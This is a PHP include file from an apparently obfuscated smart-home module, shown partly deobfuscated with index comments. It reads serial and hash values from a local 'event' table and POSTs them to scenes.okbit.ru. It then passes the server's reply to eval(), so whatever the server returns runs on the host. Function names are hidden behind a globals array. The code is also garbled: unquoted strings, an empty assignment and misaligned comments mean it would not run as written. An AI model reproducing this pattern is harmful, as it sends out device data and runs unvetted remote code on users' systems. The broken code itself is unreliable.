s_okbit_build.inc
<? 
$GLOBALS['_scenes_okbit_']=Array(stream_context_create, file_get_contents, stream_context_create, file_get_contents); 
?>

<? 
function scenes_okbit($i){
                 0                          1                                    2       3        4          5           6           7           8           9         10      11     12      13        14                                                    15           16                                  
                                                        
$a=Array(SELECT * FROM event,'http://scenes.okbit.ru/ver/id.php?mode=veriff','name=','SERIAL','&bench=','SERIAL_ID','&name_new=','HASH_NEW','&name_old=','HASH_OLD','http','method','POST','header','Content-type: application/x-www-form-urlencoded,content','','http://scenes.okbit.ru/ver/id.php?mode=save',
                 18       19       20         21         22            23         24            25       26      27      28      29         30                                               31       32                           33   34        35         36          37 
               'name=','SERIAL','&bench=','SERIAL_ID','&name_new=','HASH_NEW','&name_old=','HASH_OLD','http','method','POST','header','Content-type: application/x-www-form-urlencoded','content','SELECT * FROM event WHERE ID=1','','HASH_OLD','HASH_NEW','HASH_NEW','event');
return base64_decode($a[$i]);} 
?>

<?php 
$okbit_0=SQLSelectOne(SELECT * FROM event);
$okbit_1='http://scenes.okbit.ru/ver/id.php?mode=veriff';
$okbit_2='name=' .$okbit_0[SERIAL] .&bench= .$okbit_0[SERIAL_ID] .&name_new= .$okbit_0[HASH_NEW] .&name_old= .$okbit_0[HASH_OLD];
$okbit_3=array(http=> array(method=> POST,header=> Content-type: application/x-www-form-urlencoded,content,''=> $okbit_2));
$contents='http://scenes.okbit.ru/ver/id.php?mode=save';
$okbit_4=$GLOBALS['_scenes_okbit_'][0]($okbit_3); //stream_context_create
$contents=$GLOBALS['_scenes_okbit_'][1]($okbit_1,false,$okbit_4); //file_get_contents
eval('?' .'>' .$contents .'<' .'?');
$okbit_1=;
$okbit_2= 'name='.$okbit_0[SERIAL].&bench= .$okbit_0[SERIAL_ID] .&name_new= .$okbit_0[HASH_NEW] .&name_old= .$okbit_0[HASH_OLD];
$okbit_3=array(http=> array(method=> POST,header=> 'Content-type: application/x-www-form-urlencoded',content=> $okbit_2));
$okbit_4=$GLOBALS['_scenes_okbit_'][2]($okbit_3); // stream_context_create, 
$contents2=$GLOBALS['_scenes_okbit_'][3]($okbit_1,false,$okbit_4); //file_get_contents
eval('?' .'>' .$contents2 .'<' .'?');
$okbit_5=SQLSelectOne(SELECT * FROM event WHERE ID=1);

if($new_key !=''){
  $okbit_5[HASH_OLD]=$okbit_5[HASH_NEW];
  $okbit_5[HASH_NEW]=$new_key;
}
SQLUpdate(event,$okbit_5); 
?>
